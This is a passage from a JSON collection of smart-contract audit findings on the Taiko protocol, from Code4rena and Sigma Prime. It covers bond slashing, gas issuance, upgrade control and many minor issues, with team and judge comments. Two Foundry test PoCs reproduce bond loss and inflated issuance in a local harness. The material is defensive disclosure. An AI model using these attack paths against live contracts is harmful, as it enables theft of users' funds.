<br><https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/libs/LibProving.sol#L189-L199>\n\n```solidity\nif (isTopTier) { \n\t// A special return value from the top tier prover can signal this\n\t// contract to return all liveness bond.\n\tbool returnLivenessBond = blk.livenessBond > 0 && _proof.data.length == 32\n\t\t&& bytes32(_proof.data) == RETURN_LIVENESS_BOND;\n\n\tif (returnLivenessBond) {\n\t\ttko.transfer(blk.assignedProver, blk.livenessBond);\n\t\tblk.livenessBond = 0;\n\t} \n}\n```\n\nThese funds are now frozen since they are sent to the Guardian contract which has no ability to recover them.\n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/libs/LibVerifying.sol#L178-L189>\n\n```solidity\n                uint256 bondToReturn = uint256(ts.validityBond) + blk.livenessBond;\n\n                if (ts.prover != blk.assignedProver) {\n                    bondToReturn -= blk.livenessBond >> 1;\n                }\n\n                IERC20 tko = IERC20(_resolver.resolve(\"taiko_token\", false));\n                tko.transfer(ts.prover, bondToReturn)\n```\n\n`ts.prover` will be the Guardian since they are the last to prove the block\n\n### Proof of Concept\n\nPOC for example 1. Paste the below code into the `TaikoL1LibProvingWithTiers.t` file and run `forge test --match-test testProverLoss -vv`\n\n<details>\n\n```solidity\n\n    function testProverLoss() external{\n        giveEthAndTko(Alice, 1e7 ether, 1000 ether);\n        giveEthAndTko(Carol, 1e7 ether, 1000 ether);\n        giveEthAndTko(Bob, 1e6 ether, 100 ether);\n        console2.log(\"Bob balance:\", tko.balanceOf(Bob));\n        uint256 bobBalanceBefore = tko.balanceOf(Bob);\n        vm.prank(Bob, Bob);\n\n        bytes32 parentHash = GENESIS_BLOCK_HASH;\n        uint256 blockId = 1;\n        \n        (TaikoData.BlockMetadata memory meta,) = proposeBlock(Alice, Bob, 1_000_000, 1024);\n\n        console2.log(\"Bob balance After propose:\", tko.balanceOf(Bob));\n        mine(1);\n\n        bytes32 blockHash = bytes32(1e10 + blockId);\n        bytes32 stateRoot = bytes32(1e9 + blockId);\n\n        (, TaikoData.SlotB memory b) = L1.getStateVariables();\n        uint64 lastVerifiedBlockBefore = b.lastVerifiedBlockId;\n\n        // Bob proves transition T1 for parent P1\n        proveBlock(Bob, Bob, meta, parentHash, blockHash, stateRoot, meta.minTier, \"\");\n        console2.log(\"Bob balance After proof:\", tko.balanceOf(Bob));\n\n        uint16 minTier = meta.minTier;\n\n        // Higher Tier contests by proving transition T2 for same parent P1\n        proveHigherTierProof(meta, parentHash, bytes32(uint256(1)), bytes32(uint256(1)), minTier);\n\n        // Guardian steps in to prove T1 is correct transition for parent P1\n        proveBlock(\n            David, David, meta, parentHash, blockHash, stateRoot, LibTiers.TIER_GUARDIAN, \"\"\n        );\n\n        vm.roll(block.number + 15 * 12);\n\n        vm.warp(\n            block.timestamp + tierProvider().getTier(LibTiers.TIER_GUARDIAN).cooldownWindow * 60\n                + 1\n        );\n\n        vm.roll(block.number + 15 * 12);\n        vm.warp(\n            block.timestamp + tierProvider().getTier(LibTiers.TIER_GUARDIAN).cooldownWindow * 60\n                + 1\n        );\n\n        // When the correct transition T1 is verified Bob does permantley loses his validitybond\n        // even though it is the correct transition for the verified parent P1.\n        verifyBlock(Carol, 1);\n        parentHash = blockHash;\n\n        (, b) = L1.getStateVariables();\n        uint64 lastVerifiedBlockAfter = b.lastVerifiedBlockId;\n        assertEq(lastVerifiedBlockAfter, lastVerifiedBlockBefore + 1 ); // Verification completed\n\n        uint256 bobBalanceAfter = tko.balanceOf(Bob);\n        assertLt(bobBalanceAfter, bobBalanceBefore);\n\n        console2.log(\"Bob Loss:\", bobBalanceBefore - bobBalanceAfter);\n        console2.log(\"Bob Loss without couting livenessbond:\", bobBalanceBefore - bobBalanceAfter - 1e18); // Liveness bond is 1 ETH in tests\n    }\n\n```\n</details>\n\n### Tools Used\n\nFoundry, VScode\n\n### Recommended Mitigation Steps\n\nThe simplest solution is to allow the guardian to pay back validity and contest bonds in the same manner as for liveness bonds. This keeps the simple design while allowing bonds to be recovered if a prover or contesters action is ultimately proven correct.\n\nGuardian will pass in data in `_proof.data` that specifies the address, tiers and bond type that should be refunded. Given that Guardians already can verify any proof this does not increase centralization.\n\nWe also need to not to not recover any reward when we prove with Guardian and `_overrideWithHigherProof()` is called. If the `ts.validityBond` reward is sent to the Guardian it will be locked. Instead we need to keep it in TaikoL1 such that it can be recovered as described above\n\n```diff\n+if (_tier.contestBond != 0){\n\tunchecked {\n\t\tif (reward > _tier.validityBond) {\n\t\t\t_tko.transfer(msg.sender, reward - _tier.validityBond);\n\t\t} else {\n\t\t\t_tko.transferFrom(msg.sender, address(this), _tier.validityBond - reward);\n\t\t}\n\t}\n+}\n```\n\n**[dantaik (Taiko) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/266#issuecomment-2033385962):**\n > This is a valid report but we knew this \"flaw\" and the current behavior is by design.\n> \n> - The odd that a valid transition is proven, then contested and overwritten by another proof, then proven again with even a higher tier should be rare, if this happens even once, we should know the second prover is buggy and shall change the tier configuration to remove it.\n> - For provers who suffer a loss due to such prover bugs, Taiko foundation may send them compensation to cover there loss. We do not want to handle cover-your-loss payment in the protocol.\n\n**[adaki2004 (Taiko) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/266#issuecomment-2033985576):**\n> This is an attack on the tier system, right ? But the economical disincentives doing so shall be granted by the bonds - not to challenge proofs which we do know are correct, just to make someone lose money as there is no advantage. The challenger would lose even more money - and the correct prover would be refunded by Taiko Foundation.\n>\n > Severity: medium, (just as: https://github.com/code-423n4/2024-03-taiko-findings/issues/227)\n\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/266#issuecomment-2045155377):**\n > I am going to leave as H, I think there is a direct loss of funds here.  \n> \n> This comment:\n> \n> > The challenger would lose even more money \n> \n> Makes me second guess that slightly, but still think H is correct.\n\n***\n\n",
      "summary": "\nThis bug report is about a potential issue in the Taiko protocol's LibProving and LibVerifying contracts. It describes a scenario where both validity and contests bonds can be wrongfully slashed, even if the transition is ultimately proven to be correct. This is due to the fact that the history of the final verified transition is not taken into account. The report provides two examples of this happening and includes code snippets to demonstrate the issue. The recommended mitigation steps suggest allowing the guardian to pay back validity and contest bonds in the same way as liveness bonds, and not recovering any reward when the guardian proves a block. The severity of this bug is considered medium, but the team behind Taiko has acknowledged the issue and has plans to address it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/266",
      "tags": [],
      "finders": [
        "monrel",
        "t0x1c"
      ]
    },
    {
      "id": "31929",
      "title": "[H-01] Gas issuance is inflated and will halt the chain or lead to incorrect base fee",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L2/TaikoL2.sol#L140-L143> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L2/TaikoL2.sol#L262-L293> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L2/TaikoL2.sol#L145-L152> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L2/TaikoL2.sol#L140-L143>\n\nThe base fee calculation in the `anchor()` function is incorrect. Issuance is over inflated and will either lead to the chain halting or a severely deflated base fee.\n\n### Proof of Concept\n\nWe calculate the 1559 base fee and compare it to `block.basefee` <br><https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L2/TaikoL2.sol#L140-L143>\n\n```solidity\n        (basefee, gasExcess) = _calc1559BaseFee(config, _l1BlockId, _parentGasUsed);\n        if (!skipFeeCheck() && block.basefee != basefee) {\n            revert L2_BASEFEE_MISMATCH();\n        \n```\n\nBut the calculation is incorrect:\n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L2/TaikoL2.sol#L262-L293>\n\n```solidity\n        if (gasExcess > 0) {\n            // We always add the gas used by parent block to the gas excess\n            // value as this has already happened\n            uint256 excess = uint256(gasExcess) + _parentGasUsed;\n\n            // Calculate how much more gas to issue to offset gas excess.\n            // after each L1 block time, config.gasTarget more gas is issued,\n            // the gas excess will be reduced accordingly.\n            // Note that when lastSyncedBlock is zero, we skip this step\n            // because that means this is the first time calculating the basefee\n            // and the difference between the L1 height would be extremely big,\n            // reverting the initial gas excess value back to 0.\n            uint256 numL1Blocks;\n            if (lastSyncedBlock > 0 && _l1BlockId > lastSyncedBlock) {\n                numL1Blocks = _l1BlockId - lastSyncedBlock;\n            }\n\n            if (numL1Blocks > 0) {\n                uint256 issuance = numL1Blocks * _config.gasTargetPerL1Block;\n                excess = excess > issuance ? excess - issuance : 1;\n            }\n\n            gasExcess_ = uint64(excess.min(type(uint64).max));\n\n            // The base fee per gas used by this block is the spot price at the\n            // bonding curve, regardless the actual amount of gas used by this\n            // block, however, this block's gas used will affect the next\n            // block's base fee.\n            basefee_ = Lib1559Math.basefee(\n                gasExcess_, uint256(_config.basefeeAdjustmentQuotient) * _config.gasTargetPerL1Block\n            );\n        }\n```\n\nInstead of issuing `_config.gasTargetPerL1Block` for each L1 block we end up issuing `uint256 issuance = (_l1BlockOd - lastSyncedBlock) * _config.gasTargetPerL1Block`.\n\n`lastSyncedBlock` is only updated every 5 blocks.\n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L2/TaikoL2.sol#L145-L152>\n\n```solidity\n        if (_l1BlockId > lastSyncedBlock + BLOCK_SYNC_THRESHOLD) {\n            // Store the L1's state root as a signal to the local signal service to\n            // allow for multi-hop bridging.\n            ISignalService(resolve(\"signal_service\", false)).syncChainData(\n                ownerChainId, LibSignals.STATE_ROOT, _l1BlockId, _l1StateRoot\n            );\n            lastSyncedBlock = _l1BlockId;\n        }\n```\n\nIf `anchor()` is called on 5 consecutive blocks we end up issuing\nin total `15 * _config.gasTargetPerL1Block` instead of `5 * _config.gasTargetPerL1Block`.\n\nWhen the calculated base fee is compared to the `block.basefee` the following happens:\n\n*   If `block.basefee`reports the correct base fee this will end up halting the chain since they will not match.\n\n*   If `block.basefee` is using the same flawed calculation the chain continues but with a severely reduced and incorrect base fee.\n\nHere is a simple POC showing the actual issuance compared to the expected issuance. Paste the code into TaikoL1LibProvingWithTiers.t.sol and run `forge test --match-test testIssuance -vv`.\n\n<details>\n\n```solidity\n    struct Config {\n        uint32 gasTargetPerL1Block;\n        uint8 basefeeAdjustmentQuotient;\n    }\n\n    function getConfig() public view virtual returns (Config memory config_) {\n        config_.gasTargetPerL1Block = 15 * 1e6 * 4;\n        config_.basefeeAdjustmentQuotient = 8;\n    }\n\n    uint256 lastSyncedBlock = 1;\n    uint256 gasExcess = 10;\n    function _calc1559BaseFee(\n        Config memory _config,\n        uint64 _l1BlockId,\n        uint32 _parentGasUsed\n    )\n        private\n        view\n        returns (uint256 issuance, uint64 gasExcess_)\n    {\n        if (gasExcess > 0) {\n            uint256 excess = uint256(gasExcess) + _parentGasUsed;\n\n            uint256 numL1Blocks;\n            if (lastSyncedBlock > 0 && _l1BlockId > lastSyncedBlock) {\n                numL1Blocks = _l1BlockId - lastSyncedBlock;\n            }\n\n            if (numL1Blocks > 0) {\n                issuance = numL1Blocks * _config.gasTargetPerL1Block;\n                excess = excess > issuance ? excess - issuance : 1;\n            }\n\t\t\t// I have commented out the below basefee calculation\n\t\t\t// and return issuance instead to show the actual\n\t\t\t// accumulated issuance over 5 L1 blocks.\n\t\t\t// nothing else is changed\n\t\t\n            //gasExcess_ = uint64(excess.min(type(uint64).max));\n\t\t\t\n            //basefee_ = Lib1559Math.basefee(\n            //    gasExcess_, uint256(_config.basefeeAdjustmentQuotient) * _config.gasTargetPerL1Block\n            //);\n        }\n\n        //if (basefee_ == 0) basefee_ = 1;\n    }\n        \n    function testIssuance() external {\n        uint256 issuance;\n        uint256 issuanceAdded;\n        Config memory config = getConfig();\n        for (uint64 x=2; x <= 6 ;x++){\n            \n            (issuanceAdded ,) = _calc1559BaseFee(config, x, 0);\n            issuance += issuanceAdded;\n            console2.log(\"added\", issuanceAdded);\n        }\n\n        uint256 expectedIssuance = config.gasTargetPerL1Block*5;\n        console2.log(\"Issuance\", issuance);\n        console2.log(\"Expected Issuance\", expectedIssuance);\n        \n        assertEq(expectedIssuance*3, issuance);\n\n```\n\n</details>\n\n### Tools Used\n\nFoundry, VScode\n\n### Recommended Mitigation Steps\n\nIssue exactly `config.gasTargetPerL1Block` for each L1 block.\n\n**[dantaik (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/276#issuecomment-2031033625):**\n > This is a valid bug report. Fixed in this PR: https://github.com/taikoxyz/taiko-mono/pull/16543\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/276#issuecomment-2045139998):**\n > I don't see a direct loss of funds here and believe M is the correct severity.\n> > 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> \n> > 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n\n**[0xmonrel (Warden) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/276#issuecomment-2049465072):**\n > A halted chain leads to frozen funds. The chain will progress for a minimum of 2 blocks since the calculation is correct when `lastSyncedBlock =0` and when `_l1BlockID-lastSyncedBlock=1`\n> \n> After the second block the base fee will still be correct as long as `excess < issuance` for both the inflated and correct calculating since both result in `excess=1`\n> https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L2/TaikoL2.sol#L279-L282\n> \n> ```solidity\n>             if (numL1Blocks > 0) {\n>                 uint256 issuance = numL1Blocks * _config.gasTargetPerL1Block;\n>                 excess = excess > issuance ? excess - issuance : 1;\n>             }\n> ```\n> \n> At the block where the base fee is incorrect the chain is halted and funds are locked since the anchor now reverts in perpetuity.\n> \n> In practice Taiko can easily release all funds by upgrading the contracts but I believe such an intervention should not be considered when evaluating the severity of an issue. From [C4 Supreme Court session, Fall 2023](https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023)\n> \n> >Contract upgradability should never be used as a severity mitigation, i.e. we assume contracts are non-upgradable.\n> \n> I therefore believe a High is fair here.\n\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/276#issuecomment-2049679633):**\n > I don't entirely agree since the chain would be halted so soon in its existence, that being said, some amount of funds, albeit small, would likely be lost.  @dantaik / @adaki2004 any last comments before leaving as H severity?\n\n**[adaki2004 (Taiko) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/276#issuecomment-2049949706):**\n> Agreed, can do!\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/276#issuecomment-2051543094):**\n > Awarding as H, final decision. \n***\n\n",
      "summary": "\nSummary:\n\nThe bug report highlights an issue with the base fee calculation in the `anchor()` function of the TaikoL2 contract. This results in incorrect issuance and can either lead to the chain halting or a severely deflated base fee. The report provides a proof of concept and suggests issuing exactly `config.gasTargetPerL1Block` for each L1 block as a mitigation step. The severity of the bug is debated among the team, with some suggesting a Medium (M) severity due to no direct loss of funds, while others argue for a High (H) severity as the halted chain can lead to frozen funds and contract upgradability should not be used as a severity mitigation. In the end, the bug is awarded a High severity and is confirmed and commented by the Taiko team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/276",
      "tags": [],
      "finders": [
        "monrel"
      ]
    },
    {
      "id": "36021",
      "title": "Gas Optimisations",
      "impact": "LOW",
      "content": "## Description\n\nSome areas of the protocol could be altered to save gas:\n\n- Line [51] of `Guardians.sol` uses a storage variable’s length in a loop; this should be cached in a local variable to prevent storage being accessed on every loop.\n- Store `_approvals[version][hash]` in memory rather than accessing it twice in a row on lines [88-89] of `Guardians.sol`.\n\n## Recommendations\n\nReview noted areas and make alterations as seen fit.\n\n## Resolution\n\nApplicable gas optimisations have been added in PR #15576.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36020",
      "title": "Security Council Is Owner Of TaikoTimelockController Proxy Allowing Upgrades",
      "impact": "LOW",
      "content": "## Description\n\nAccording to the deploy scripts, the owner of the `TaikoTimelockController` contract will be the security council. The `TaikoTimelockController` is an upgradable proxy, which can be upgraded instantly by the owner. Therefore, it is possible for the security council to upgrade the timelock controller without any governance voting or delays. \n\nThe `TaikoTimelockController` could be upgraded, through the proxy, to a contract without any delays and ignores voting from the `TaikoGovernor` contract. The issue is important since `TaikoTimelockController` is the owner of most other contracts in the system, such as `TaikoL1`. Setting a malicious contract as the controller would allow making arbitrary changes to the protocol and draining all funds in the bridge.\n\n## Recommendations\n\nIt is recommended to have the `TaikoTimelockController` own itself. This enforces at least the minimum delay required to elapse before a proxy upgrade.\n\n## Resolution\n\nThe development team have opted not to fix this issue. Instead, the initial owner will be the security council. After a period of time when the development team is happy with the security maturity of the protocol, they may transfer ownership to the `TaikoTimelockController`.\n\n## TKO-26 Miscellaneous General Comments\n\n- **Asset**: All contracts  \n- **Status**: Resolved: See Resolution  \n- **Rating**: Informational  \n\nThis section details miscellaneous findings discovered by the testing team that do not have direct security implications:\n\n1. **Reachable assert Statement**  \n   - **Related Asset(s)**: `L1/verifiers/PseZkVerifier.sol`  \n   There is an assert statement on line `[75]` of `PseZkVerifier.sol` which can be reached if an invalid proof is supplied. The following assert will be triggered when a prover supplies a `pointProof` and `blobUsed = false`. While it is not the happy path and the transaction should revert for this case, it is desirable to revert with an error message. This will reduce the gas cost for users and provide an explanation as to why.\n   ```solidity\n   assert(zkProof.pointProof.length == 0);\n   ```\n   Consider changing the assert statement to a revert with an error message.\n\n2. **Events Declared But Never Used**  \n   - **Related Asset(s)**: `bridge/Bridge.sol`  \n   The events `SignalSent` and `DestChainEnabled` are declared but never used. If not needed, remove the unused events.\n\n3. **Optimistic Proofs Denoted By Default Address**  \n   - **Related Asset(s)**: `L1/libs/LibProving.sol`  \n   The verifier address for optimistic proofs is denoted by `address(0)` which is also the default returned by values not set in Solidity. This could lead to bypassing proofs if future verifiers are not set up correctly such as not being set in the `AddressManager`, such mistakes might be difficult to notice at first due to the fact the system will misinterpret the missing verifier entry as an optimistic proof and the call to `proveBlock()` would succeed. The proving system should first check for an optimistic proof, then if one is not found it can revert should `resolver.resolve()` return the zero address.\n\n4. **Typos**  \n   - **Related Asset(s)**: `contracts/*`  \n   Typos were noticed in some file, these should be corrected for clarity:\n     - Line `[198]` of `LibProposing.sol`: \"alghouth\" should be \"although\".\n     - Line `[245]` of `LibProposing.sol`: \"shall choose use extra\" should be \"should choose to use extra\".\n     - Line `[47]` of `SgxVerifier.sol`: \"timstamp\" should be \"timestamp\".\n     - Line `[16]` of `L1/hooks/AssignmentHook.sol`: \"variﬁcation\" should be \"veriﬁcation\".\n   Review noted areas and make alterations as seen fit.\n\n5. **LibRLPReader Can Only Parse Lists Shorter 32 Elements**  \n   - **Related Asset(s)**: `thirdparty/LibRLPReader.sol`  \n   `LibRLPReader.sol` can only parse lists smaller than `MAX_LIST_LENGTH` which is currently set to 32. `LibRLPReader.sol` is used to parse MPT proofs; as such, if a proof is longer than 32 nodes it will not be able to be verified. This would require a very large MPT, however (impossible considering gas limits), and is thus very unlikely. Consider removing or increasing `MAX_LIST_LENGTH`.\n\n6. **Unnecessary Functions in Some Contracts**  \n   - **Related Asset(s)**: `signal/SignalService.sol & common/AddressManager.sol`  \n   The `SignalService` contract inherits from `AuthorizableContract` and this latter inherits from `EssentialContract` which also inherits from `OwnerUUPSUpgradable`. So, the contract `SignalService` has the functions `pause()` and `unpause()` which are not necessary as the modifiers `whenPaused` and `whenNotPaused` are never used in `SignalService`.  \n   The contract `AddressManager` inherits from `OwnerUUPSUpgradable`, so `AddressManager` has the `pause()` and `unpause()` functions which are not necessary as the modifier `whenNotPaused` is never used in `AddressManager`. Change the design of inheritance so that the contracts don’t have unnecessary functions. This would also avoid extra bytecodes and save deployment costs.\n\n7. **sendEther() With Zero Amount**  \n   - **Related Asset(s)**: `bridge/Bridge.sol & tokenVaults/ERCxxxVault.sol`  \n   In the function `Bridge.processMessage()`, it is possible that the call `refundTo.sendEther(refundAmount)` on line `221` is made with `refundAmount == 0`. For each `receiveToken()` function of the different `ERCxxx` vaults, the call `_to.sendEther(msg.value)` is made without checking the `msg.value`, which could be 0. To avoid unnecessary external calls and potentially save gas, consider checking that the amount argument used in `sendEther()` is greater than 0.\n\n8. **Duplicate Comment**  \n   - **Related Asset(s)**: `thirdparty/LibMerkleTrie.sol`  \n   `_getSharedNibbleLength()` has a duplicated NatSpec comment. Remove the duplicate comment to improve readability.\n\n9. **Missing Comments**  \n   - **Related Asset(s)**: `thirdparty/LibBytesUtils.sol`, `thirdparty/LibUint512Math.sol & thirdparty/LibRLPReader.sol`  \n   Some functions have functionality or edge cases that are undocumented and may be unexpected:\n     - `LibUint512Math.add()` does not revert when an overflow occurs.\n     - `LibBytesUtils.toBytes32()` will align to the left if the input is smaller than 32 bytes. For example: input `0xff` will return `0xff00...00`.\n     - `LibRLPReader.readBytes32()` will align to the right for an input smaller than 32 bytes.\n     - `LibRLPReader.readAddress()` will return `address(0)` on any input with a length of 1, regardless of the input's value.\n   It is recommended to mention these edge cases in comments to avoid future issues.\n\n10. **High Mainnet Gas May Lead To Degraded Network Performance**  \n    - **Related Asset(s)**: `L1/*`  \n    As Taiko settles on the Ethereum Mainnet and does so in a decentralized manner, it is sensitive to gas price fluctuations. ETH deposits, for example, are only processed once a new block is proposed. Therefore, if Layer 1 gas becomes very expensive, depositing could become impossible as proposers cease to publish `proposeBlock()` transactions due to it not being profitable. This can be further exacerbated by the max deposit queue size of 1024 deposits, meaning that if this cap is reached, all further attempts to queue a deposit will revert. Likewise, other actions such as proving or verifying blocks may also become too expensive gas-wise for third-party actors to run, leading to degraded performance for users transacting on Taiko.  \n    Inform users of Taiko limitations and best practices during times of high Layer-1 congestion. Determine if it is worthwhile for the Taiko team to run their own proposer & prover set that can maintain the network performance at a loss during high congestion periods.\n\n11. **Comments Link To Broken URLs**  \n    - **Related Asset(s)**: `thirdparty/*`  \n    Some files have comments that contain broken links, such as `LibBytesUtils.sol` linking to the optimism repository which no longer works. It is recommended to replace these broken links with the updated version, e.g., the optimism-legacy repository.\n\n12. **Confusing Comments Or Variable Names**  \n    - **Related Asset(s)**: `L1/gov/TaikoGovernor.sol`, `L1/tiers/TaikoA6TierProvider.sol & L1/provers/Guardians.sol`  \n    Some variables or comments are misleading and could be made clearer, such as:\n      - On line `[86]` of `TaikoGovernor.sol`, the comment refers to \"proposer\"; however, as Taiko also uses this term to mean block proposers, it is advised to clearly state the votes make a voter become a vote proposer for the governance system, not a block proposer.\n      - Each tier in `TaikoA6TierProvider.sol` has its own `maxBlocksToVerify` field which is used when verifying after proving a block. This is not used when proposing blocks, which use the tier agnostic `config.maxBlocksToVerifyPerProposal`. The tier field should have its name made clearer such as `maxBlocksToVerifyPerProof` to emphasize this.\n      - `Guardians.setGuardians()` makes use of arrays called `guardians` and `_guardians`. Having these arrays with the same type increases the likelihood of errors in future alterations. It is advised to differentiate the arrays by more than one character, such as renaming `_guardians` to `newGuardians`.  \n    Review noted areas and delete redundant code to save on deployment costs if deemed worthwhile.\n\n13. **Redundant Code**  \n    - **Related Asset(s)**: `L1/*`  \n    Some lines of code are redundant and can be deleted. For example:\n      - Lines `[85-87]` of `LibVerifying.sol` contain inequalities where we have `x < 0` for an unsigned integer `x` which will never return true. Likewise, `config.ethDepositMaxFee >= type(uint96).max` from line `[89]` is redundant in light of the stronger condition included on line `[90]`: `config.ethDepositMaxFee >= type(uint96).max / config.ethDepositMaxCountPerBlock`.\n      - For `TaikoGovernor.sol` and `TaikoTimelockController.sol`, only parent contracts in proxies need the storage `_gap` variable; in these contracts, it serves no purpose.\n      - In `Guardians.sol` line `[46]` contains `_minGuardians == 0` which is redundant; the second check covers this because line `[42]` ensures `guardians.length >= 5`, hence `_minGuardians < _guardians.length / 2` is equal or stronger than `_minGuardians < 2`.\n      - In `LibProving.sol` on line `[170]`, the condition `proof.tier < meta.minTier` is redundant as the condition that comes directly after it coupled with the check on line `[164]` ensures this condition is already matched.  \n    Review noted areas and delete redundant code to save on deployment costs if deemed worthwhile.\n\n14. **No Cap For Amount Of ETH Deposits**  \n    - **Related Asset(s)**: `L1/libs/LibVerifying.sol`  \n    A stronger condition is suggested for `ethDepositMaxCountPerBlock` in `isConfigValid()` as currently it has no cap and cannot be changed once set without moving to new proxy logic. If the value is set too high, it would be possible for all ETH deposits into Taiko to become halted as if the deposit queue grew to such a size where any block proposing reverted. Furthermore, as deposits are processed as part of the block proposal call, it would also freeze any future block proposals for Taiko until the proxy migrated to a new implementation. Consider adding an upper bound check to `ethDepositMaxCountPerBlock` in `isConfigValid()`. Alternatively, verify the config values have been set correctly after deployment.\n\n15. **Total Supply Of TKO Token Difficult To Determine**  \n    - **Related Asset(s)**: `L1/TaikoL1.sol`, `L1/libs/LibVerifying.sol & L1/libs/LibProving.sol`  \n    In the Taiko system, TKO bonds are taken for various actions and stored in the `TaikoL1.sol` contract. If the prover performs an action incorrectly, they can lose their TKO bond, some of which is burnt. This burning occurs simply by leaving the TKO balance unallocated in the `TaikoL1.sol` contract.  \n    This mechanism makes it difficult for third-party organizations to determine the true liquid total supply of TKO as the `TaikoL1.sol` contract both holds tokens awaiting return to provers and those considered burnt and out of the token supply. Furthermore, leaving burnt tokens in an upgradable contract is not advisable for security reasons; it is possible a future vulnerability allows a user to then drain these burnt tokens, which would cause large ecosystem issues once sold.  \n    Either burnt TKO tokens should be sent to a recognizable burn address such as `address(0)` or a record of the total burnt tokens should be maintained and used to prevent these burnt tokens from being transferred again.\n\n16. **Errors Missing From File**  \n    - **Related Asset(s)**: `L1/libs/LibProposing.sol`  \n    On line `[38]` it states “Warning: Any errors defined here must also be defined in `TaikoErrors.sol`.”; however, the errors `L1_TXLIST_OFFSET` and `L1_TXLIST_SIZE` are not included in `TaikoErrors.sol`. Ensure all errors included in `LibProposing.sol` are present in `TaikoErrors.sol`. Note that there are two unused errors, `L1_TXLIST_OFFSET_SIZE` and `L1_TXLIST_TOO_LARGE` in `TaikoErrors.sol`.\n\n17. **Unused Errors**  \n    - **Related Asset(s)**: `L1/TaikoErrors.sol`  \n    The following errors are not used and can be safely removed:\n    - `L1_INSUFFICIENT_TOKEN`\n    - `L1_INVALID_ADDRESS`\n    - `L1_INVALID_AMOUNT`\n    - `L1_TXLIST_OFFSET_SIZE`\n    - `L1_TXLIST_TOO_LARGE`\n\n18. **Unused Events**  \n    - **Related Asset(s)**: `L1/TaikoEvents.sol`  \n    The following events are not used and can be safely removed:\n    - `TokenDeposited`\n    - `TokenWithdrawn`\n    - `TokenCredited`\n    - `TokenDebited`\n\n19. **Reachable Overflow**  \n    - **Related Asset(s)**: `L1/hooks/AssignmentHook.sol`  \n    It is possible to cause an overflow on line `[95]` of `AssignmentHook.sol`. The overflow occurs if `input.tip` is set to a value just below `2256`. The solidity compiler will have built-in overflow checking for this case and thus, when triggered, the transaction will revert.\n    ```solidity\n    uint256 refund;\n    if (assignment.feeToken == address(0)) {\n        if (msg.value < proverFee + input.tip) { //@audit proverFee + input.tip can overflow \n            revert HOOK_ASSIGNMENT_INSUFFICIENT_FEE();\n        }\n    }\n    ```\n    Consider setting a maximum bound on `input.tip`.\n\n20. **Inaccuracy In Comment About Required Check**  \n    - **Related Asset(s)**: `L1/libs/LibProving.sol`  \n    The comment in the following code snippet is not correct. The check `blk.metaHash != keccak256(abi.encode(meta))` is necessary to ensure the supplied parameters for `proveBlock()` match those generated in `proposeBlock()`. Without this check, a malicious prover could change a range of fields such as `meta.isBlobUsed`.\n    ```solidity\n    // Check the integrity of the block data. It's worth noting that in \n    // theory, this check may be skipped, but it's included for added \n    // caution.\n    if (blk.blockId != meta.id || blk.metaHash != keccak256(abi.encode(meta))) {\n        revert L1_BLOCK_MISMATCH();\n    }\n    ```\n    Remove the sentence about skipping the check.\n\n21. **Provers May Contest Their Own Proof**  \n    - **Related Asset(s)**: `L1/libs/LibProving.sol`  \n    It is possible for a prover to contest their own state transition. The malicious user would lose a portion of their bond depending on which root ends up being correct. Thus, it is not an economically viable attack. Consider preventing the prover from contesting their own transition.\n\n## Recommendations\n\nEnsure that the comments are understood and acknowledged, and consider implementing the suggestions above.\n\n## Resolution\n\nThe development team have addressed issues where appropriate in PRs #15600 and #15605.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
